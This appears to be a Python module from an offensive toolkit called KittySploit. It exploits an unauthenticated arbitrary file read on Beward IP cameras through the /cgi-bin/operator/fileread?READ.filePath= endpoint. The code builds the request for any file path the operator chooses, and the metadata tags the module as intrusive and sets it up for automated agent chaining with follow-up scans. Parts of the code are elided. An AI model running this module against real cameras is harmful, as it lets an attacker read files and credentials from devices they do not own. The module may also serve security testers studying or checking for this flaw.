#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Beward IP camera arbitrary file read via fileread."""
...
class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Beward IP Camera - fileread File Read',
        'description': (
            'Reads arbitrary files via /cgi-bin/operator/fileread?READ.filePath=.'
        ),
        'author': ['KittySploit Team'],
        'platform': Platform.LINUX,
        'references': [],
        'tags': ['beward', 'camera', 'lfi', 'file-read', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            ...
            'chain': {
                ...
                'option_bindings': {},
                'suggested_followups': ['scanner/http/beward_fileread_detect'],
            },
        },
    }
    ...
    def execute(self, file_path: str) -> str:
        ...
        if not remote.startswith('/'):
            remote = '/' + remote
        path = f'/cgi-bin/operator/fileread?READ.filePath={remote}'
        r = self.http_request(
            method='GET',
            path=path,
    ...
    def run(self):
        ...
        print_status(f'Reading {target} via Beward fileread ...')
